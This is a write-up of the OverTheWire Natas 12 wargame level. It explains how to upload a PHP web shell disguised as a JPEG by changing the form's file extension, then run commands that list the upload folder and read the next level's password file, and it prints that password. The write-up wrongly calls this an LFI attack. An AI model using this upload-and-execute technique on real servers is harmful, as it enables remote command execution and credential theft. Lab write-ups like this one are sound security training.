# [Natas 12](http://natas12.natas.labs.overthewire.org/)

![1](https://github.com/GHAFRI/Writeups/blob/master/Web/OverTheWire/Natas/Natas12/1.png)

## Solution

If we check the source code we see
```
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="wkmjb7q5ue.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
```
As we keep refreshing the page, we still get `random` name for the `value="wkmjb7q5ue.jpg"` file.
If we have a look at the [Source code](http://natas12.natas.labs.overthewire.org/index-source.html), we see
```
<?  

function genRandomString() { 
    $length = 10; 
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
    $string = "";     

    for ($p = 0; $p < $length; $p++) { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 

    return $string; 
} 

function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 

if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
} else { 
?> 

<form enctype="multipart/form-data" action="index.php" method="POST"> 
<input type="hidden" name="MAX_FILE_SIZE" value="1000" /> 
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" /> 
Choose a JPEG to upload (max 1KB):<br/> 
<input name="uploadedfile" type="file" /><br /> 
<input type="submit" value="Upload File" /> 
</form> 
```
We see that the file gets a random `path` from the function `makeRandomPath()` and `name` from `genRandomString()`.
Down we also see `<? print genRandomString(); ?>.jpg` which was also presented in `index.php` webpage. 
This is an LFI type of attack, for extra details check [trialofbits](https://vimeo.com/32509769).
A tpical PHP line to exploit check: <? echo system(\" ls; \") ?>
Now lets make a `php` line hidden in a `jpg`. 
To do that we use: `echo "string " > name.jpg`.
So, we use `echo "<? echo system(\" ls \"); ?>" > 1.jpg`.
Now we go back to the site and upload the image file.
Before we click on `Upload`, we `Inspect` on the image that we uploaded using `Dev Tools`.
We look back for `value="random_name.jpg"` and we change it to `value="random_name.php`.
We click `Enter` to make sure its changed.
Now `Upload`.
It gives us `The file upload/j31o6bx15x.php has been uploaded`, when we check that page we get this list
```
3fw5idg4y8.php
3kzfrrvgig.php
5mwyyz89cj.jpg
77smoe16do.php
9xpr4x28pp.jpg
bf0tmyncki.jpg
ccw3b8bcic.jpg
eowa7mjj39.php
j31o6bx15x.php
klpn4rtlu0.php
lj1edrky2p.jpg
mvlaf05fnt.jpg
o6ktlghv56.php
q2k5lew3pp.jpg
qvipmjgium.php
qvipmjgium.php
````
It seems the exploit worked. Those are probably `exploits` from other players to find the `password`. We can check them for a clue for the location or we can just use the same location we found in `Natas10`.
To do that, we create a new file with new code by `echo "<? echo system(\" cat /etc/natas_webpass/natas13 \"); ?>" > 2.jpg`.
This will display the Natas13 password for us.
Now we do the same steps like before and we check
```
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
``` 
Finally, the passcode is `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`.

